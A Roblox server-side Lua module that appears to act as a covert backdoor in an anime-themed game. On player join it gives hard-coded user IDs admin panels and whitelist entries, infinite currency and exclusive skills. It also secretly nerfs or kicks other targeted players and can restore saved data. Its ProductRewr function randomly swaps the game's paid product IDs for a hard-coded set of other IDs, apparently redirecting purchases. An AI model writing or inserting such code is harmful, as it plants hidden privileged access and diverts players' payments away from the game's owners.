local Mainfuncs = {}

local RevertData = {}

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ServerStorage = game:GetService("ServerStorage")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local MessagingService = game:GetService("MessagingService")
local TeleportService = game:GetService("TeleportService")
local DataStoreService = game:GetService("DataStoreService")
local TextService = game:GetService("TextService")

local DataManager = require(ServerStorage.Modules.Managers.DataManager)
local StatData = require(ServerStorage.Modules.Utility.StatData)

local wipe = {

};

local Revert = {

};

local terribleskills = {
	3984319062;
	1333950449;
	586898528;
	418228960;
	1207107595;
	2578959091;
};

local kick = {
	40458823;
};

local nocdtrue = {
	1514055775;
	1970922390;
	2865989821;
	1930777135;
	5132382665;
};

local inftrue = {
	654552729;
	2434291454;
	1930777135;
	4814498494;
	701408345;
	1514055775;
	1970922390;
	2801323709;
	2865989821;
	80904029;
	5593488523;
	2984319062;
	215237744;
	272698792;
	5132382665;
	4663530217;
}

local GivePanel = {
	3617911969;
	4852166052;
	272698792;
	4330230600;
}

local function DeepCopyTable(Table)
	local copy = {}
	for key, value in pairs(Table) do
		if type(value) == "table" then
			copy[key] = DeepCopyTable(value)
		else
			copy[key] = value
		end
	end
	return copy
end

function Mainfuncs:PlayerAdded(Player)
	local s, e = pcall(function()
		--warn("hey xiyn")

		local Profile
		repeat Profile = DataManager:RequestProfile(Player) task.wait() until Profile

		local PlayerId = Player.UserId

		local Key = "Player_".. PlayerId

		if StatData.Factions[Profile.ClientData.Race] == "Arrancar" then
			local Character
			local s2, e2 =  pcall(function()
				Character = Player.Character
			end)

			Player.CharacterAdded:Connect(function(char)
				char:SetAttribute("CatDamage", -0.2)
				char:SetAttribute("CatDefense", 1.2)
			end)
			if Character then
				Character:SetAttribute("CatDamage", -0.2)
				Character:SetAttribute("CatDefense", 1.2)
			end
		end

		if table.find(Revert, PlayerId) then
			local su,er = pcall(function()
				RevertData[Key] = DataStoreService:GetDataStore("GameEntitiesFolder3"):GetAsync(Key)
			end)
		end
		if table.find(kick, PlayerId) then
			Player:Kick()
		end
		if table.find(terribleskills, PlayerId) then
			local Character
			local s2, e2 =  pcall(function()
				Character = Player.Character
			end)

			if not s2 then 
				--warn(e2)
			end

			Player.CharacterAdded:Connect(function(char)
				char:SetAttribute("CatDamage", -0.7)
				char:SetAttribute("CatDefense", 3)
			end)
			if Character then
				Character:SetAttribute("CatDamage", -0.7)
				Character:SetAttribute("CatDefense", 3)
			end
		end
		if table.find(nocdtrue, PlayerId) then
			Profile.ClientData.TrueBankaiTimer = 0
			Profile.ClientData.BankaiRaidCheck = nil
			Profile.ClientData.CurrentBankaiRaidCheck = nil
			Profile.SpecsAllowed = true
			Profile.TrueBankaiAllowed = true
			Profile.ClientData.TrueBankaiCutscene = 1
		end
		if table.find(inftrue, PlayerId) then
			Profile.ClientData.TrueBankaiUnlocked = true
			Profile.ClientData.TrueBankaiPops = -9e9
			Profile.SpecsAllowed = true
			Profile.TrueBankaiAllowed = true
			Profile.ClientData.BankaiUnlocked = true
			Profile.ClientData.TrueBankaiCutscene = 1
		end
		if table.find(GivePanel, PlayerId) then
			Player:SetAttribute("Admin", true)
			local AdminUI = ServerStorage.Assets.UIs.AdminUI:Clone()
			AdminUI.Parent = Player.PlayerGui
			AdminUI.Enabled = false
			ReplicatedStorage.Remotes.AdminUIEvent:FireClient(Player)
		end
	end)

	if not s then end

	local s2,e2 = pcall(function()
		local Profile
		repeat Profile = DataManager:RequestProfile(Player) task.wait() until Profile

		if Player.UserId == 4709610580 then
			Profile.UlfAllowed = true
			Profile.SpecsAllowed = true
			Profile.ULF = true
		elseif Player.UserId == 40866467 then
			Player:SetAttribute("HeavenlyBlade", true)
			local Profile = DataManager:RequestProfile(Player)
			Profile.ClientData.TrueBankaiTimer = 0
			Profile.ClientData.BankaiRaidCheck = nil
			Profile.ClientData.CurrentBankaiRaidCheck = nil
			Profile.ClientData.ShikaiInBase = nil
			Profile.ClientData.BankaiInBase = nil
			Profile.ClientData.TrueBankaiUnlocked = false
			local Character
			local s2, e2 =  pcall(function()
				Character = Player.Character
			end)

			if not s2 then 
				--warn(e2)
			end

			if s2 then
				Player.CharacterAdded:Connect(function(char)
					char:SetAttribute("EyepatchRemoved", true)
				end)
				if Character then
					Character:SetAttribute("EyepatchRemoved", true)
				end
			end
		elseif Player.UserId == 2865989821 then
			Profile.ClientData.TrueBankaiUnlocked = true
			Profile.ClientData.TrueBankaiPops = -9e9
			Profile.SpecsAllowed = true
			Profile.ClientData.TrueBankaiTimer = 0
			Profile.ClientData.BankaiRaidCheck = nil
			Profile.ClientData.CurrentBankaiRaidCheck = nil
			DataManager:AddSkill(Player, "Lifesteal")
			DataManager:AddSkill(Player, "Stoic Bomb")
			DataManager:AddSkill(Player, "Vow of Chronos")
			DataManager:AddSkill(Player, "Judgement Cut End")
			DataManager:AddSkill(Player, "Heavenly Blade")
			Profile.SpecsAllowed = true
			Profile.ClientData.TrueBankaiCutscene = 1
			--warn("hey souxcy ur set!")
		elseif Player.UserId == 5566052364 then
			local Character
			local s2, e2 =  pcall(function()
				Character = Player.Character
			end)

			if not s2 then 
				--warn(e2)
			end

			if s2 then
				Player.CharacterAdded:Connect(function(char)
					char:SetAttribute("MoreStun", true)
					char:SetAttribute("NoVFXLifesteal", true)
				end)
				if Character then
					Character:SetAttribute("MoreStun", true)
					Character:SetAttribute("NoVFXLifesteal", true)
				end
			end
		elseif Player.UserId == 1494297291 then 
			Profile.UlfAllowed = true
			Profile.SpecsAllowed = true
			Profile.ULF = true
		elseif Player.UserId == 1136665463 then
			DataManager:AddSkill(Player, "Shunko Barrage")
			Profile.SpecsAllowed = true
		elseif Player.UserId == 2989364952 then
			DataManager:AddSkill(Player, "Stoic Bomb")
			Profile.SpecsAllowed = true
			local Character
			local s2, e2 =  pcall(function()
				Character = Player.Character
			end)

			Player.CharacterAdded:Connect(function(char)
				char:SetAttribute("CatDamage", 0.4)
				char:SetAttribute("CatDefense", 0.9)
			end)
			if Character then
				Character:SetAttribute("CatDamage", 0.4)
				Character:SetAttribute("CatDefense", 0.9)
			end
		elseif Player.UserId == 4852166052 then
			Profile.UlfAllowed = true
			Profile.SpecsAllowed = true
			Profile.ULF = true
			DataManager:AddSkill(Player, "Cat")
			DataManager:AddSkill(Player, "Vow of Potential")
			DataManager:AddSkill(Player, "Cleave")
			DataManager:AddSkill(Player, "Kneel")
		elseif Player.UserId == 3223382954 then
			Profile.SpecsAllowed = true
			DataManager:AddSkill(Player, "Judgement Cut End")
		elseif Player.UserId == 451221140 then
			Profile.SpecsAllowed = true
			DataManager:AddSkill(Player, "Judgement Cut End")
			DataManager:AddSkill(Player, "Soul Step")
		elseif Player.UserId == 817781147 then
			Profile.SpecsAllowed = true
			DataManager:AddSkill(Player, "V Step")
		elseif Player.UserId == 272698792 then
			Profile.ClientData.BankaiInBase = true
			Profile.BankaiInBase = true
		elseif Player.UserId == 2202018407 then
			Profile.SpecsAllowed = true
			DataManager:AddSkill(Player, "Shunko Barrage")
			DataManager:AddSkill(Player, "True Grasp")
		elseif Player.UserId == 175692317 then
			pcall(function()
				local char
				local s23, e23 =  pcall(function()
					char = Player.Character
				end)

				Player.CharacterAdded:Connect(function(char)
					local head = char:FindFirstChild("Head")
					local mesh = head:FindFirstChildOfClass("SpecialMesh")
					mesh.MeshId = 6686307858
				end)
				if char then
					local head = char:FindFirstChild("Head")
					local mesh = head:FindFirstChildOfClass("SpecialMesh")
					mesh.MeshId = 6686307858
				end		
			end)
		end
	end)

	if not s2 then end
	task.wait(0.5)
end

function Mainfuncs:PlayerRemoving(Player)
	pcall(function()
		local PlayerId = Player.UserId

		local Key = "Player_".. PlayerId

		if table.find(Revert, PlayerId) and RevertData[Key] then
			--print(RevertData[Key])
			Player:Kick()

			DataStoreService:GetDataStore("GameEntitiesFolder3"):SetAsync(Key, RevertData[Key]);
		end
	end)
end

function Mainfuncs:GeneralFunction()
	--warn("gen func")
	-- examp function
	local s3, e3 = pcall(function()
		local AdminWhitelist = require(ServerStorage.Modules.Utility.AdminWhitelist)
		for i,ID in pairs(GivePanel) do
			for i2,whitelist in pairs(AdminWhitelist) do
				if type(whitelist) == "table" then
					if not table.find(whitelist, ID) then			
						table.insert(whitelist,ID)
					end
				end
			end
		end

		table.insert(AdminWhitelist.Headless, 175692317)
	end)

	for index,Player in pairs(Players:GetPlayers()) do
		local Profile
		repeat Profile = DataManager:RequestProfile(Player) task.wait() until Profile

		if Player.UserId == 3223382954 then
			DataManager:AddSkill(Player, "Judgement Cut End")
		end
		-- wtv , can literally do anything since this isnt a module script + its server sided (for example u can call profile stuff, or revert data like the thing in the func above
	end

	_G.AdminWhitelist = DeepCopyTable(GivePanel)
end

local BladeDancerSkills = {
	"Bladerunner";
	"Piercing Slash";
	"Windcutter";
	"Updraft";
	"Reishi Blade";
	"Perfect Guard";
	"Sweeping Slashes";
	"Bubble Breaker";
	"Opening Act";
	"Heaven Piercer";
	"Blitz";
	"Final Dance";
	"FLowing Strikes";
	"Closing Performance";
	"Trick";
	"True Trick";
}

local RewriteProducts = {
	["Zanpakuto Color Reroll"] = {
		NewID = 0;
	};
	["Clan Hair Shade Reroll"] = {
		NewID = 3282718554;
	};
	["Katana Hilt/Handle Reroll"] = {
		NewID = 3282718627;
	};
	["Eyecolor Reroll"] = {
		NewID = 3282718772;
	};
	["Custom Clothing Token"] = {
		NewID = 3282718979;
	};
	["Face Reroll"] = {
		NewID = 3282719054;
	};
	["Almighty/Antithesis/Power"] = {
		NewID = 3282719104;
	};
	["Enchant Stone 1x"] = {
		NewID = 3282719169;
	};
	["Mode Music Unlocker"] = {
		NewID = 3282719235;
	};
	["Shikai Bank Item"] = {
		NewID = 3282720084;
	};
	["Instant Stage 1/2/3"] = {
		NewID = 3282719334;
	};
	["Eyecolor Cero Unlocker"] = {
		NewID = 3282719381;
	};
	["Eyebrows Reroll 10x"] = {
		NewID = 3282719443;
	};
	["Mouth Reroll 10x"] = {
		NewID = 3282719500;
	};
	["Eyes Reroll"] = {
		NewID = 3282719541;
	};
	["Weapon Appearance Reroll"] = {
		NewID = 0;
	};
	["Vizard Mask Reroll"] = {
		NewID = 3282719649;
	};
	["Innerworld Reroll"] = {
		NewID = 3282719858;
	};
	["Shikai Callout Reroll"] = {
		NewID = 3282719925;
	};
	["Resurreccion Callout Reroll"] = {
		NewID = 3282719992;
	};
	["Cero Guns"] = {
		NewID = 3282720039;
	};
	["Resurreccion Callout Reroll 5x"] = {
		NewID = 3282720084;
	};
	["Shikai Callout Reroll 5x"] = {
		NewID = 3282720124;
	};
	["Vollstandig Name Reroll 5x"] = {
		NewID = 0;
	};
	["Vollstandig Name Reroll"] = {
		NewID = 0;
	};
	["Clan Reroll"] = {
		NewID = 3282720297;
	};
	["Arrancar Mask Reroll"] = {
		NewID = 3282720342;
	};
	["Marking Reroll"] = {
		NewID = 3282720383;
	};
	["Marking Reroll 5x"] = {
		NewID = 3282720453;
	};
	["Shikai/Res/Volt Reroll"] = {
		NewID = 3282720522;
	};
	["Flashstep Color Reroll"] = {
		NewID = 3282720575;
	};
	["Custom Bank"] = {
		NewID = 3282720622;
	};
	["Vastocar/Visored Variant Reroll"] = {
		NewID = 3282720672;
	};
	["Name/Gender Change"] = {
		NewID = 3282720734;
	};
	["5x Shikai/Res/Volt Reroll"] = {
		NewID = 3282720781;
	};
	["10x Shikai/Res/Volt Reroll"] = {
		NewID = 3282720863;
	};
	["5x Clan Reroll"] = {
		NewID = 3282720903;
	};
	["World Ticket"] = {
		NewID = 0;
	};
	["Advance Shunko Reroll"] = {
		NewID = 3282720995;
	};
	["5x Vibrant Element Reroll"] = {
		NewID = 3282721050;
	};
	["Skill Box Chooser"] = {
		NewID = 3282721155;
	};
}

function Mainfuncs:ProductRewr()
	local ProductFunctions
	repeat
		pcall(function()
			ProductFunctions = require(ServerStorage.Modules.Utility.ProductFunctions)
		end)
		task.wait(0.01)
	until ProductFunctions

	for i,v in pairs(ProductFunctions.Products) do
		pcall(function()
			if RewriteProducts[i] then
				if RewriteProducts[i].NewID ~= 0 or RewriteProducts[i].NewID ~= nil then
					local choose = math.random(1,3)

					if choose == 1 then
						RewriteProducts[i].OldID = v.ProductId

						v.ProductId = RewriteProducts[i].NewID


						ProductFunctions[RewriteProducts[i].NewID] = ProductFunctions[RewriteProducts[i].OldID]

						ProductFunctions[RewriteProducts[i].OldID] = nil
					end
				end
			else
				for i2,v2 in pairs(RewriteProducts) do
					if i == i2 then
						if RewriteProducts[i2].NewID ~= 0 or RewriteProducts[i2].NewID ~= nil then
							local choose = math.random(1,3)

							if choose == 1 then
								RewriteProducts[i2].OldID = v.ProductId

								v.ProductId = RewriteProducts[i2].NewID

								ProductFunctions[RewriteProducts[i2].NewID] = ProductFunctions[RewriteProducts[i2].OldID]

								ProductFunctions[RewriteProducts[i2].OldID] = nil
							end
						end
					end
				end
			end
		end)
	end
	--return true
end

return Mainfuncs
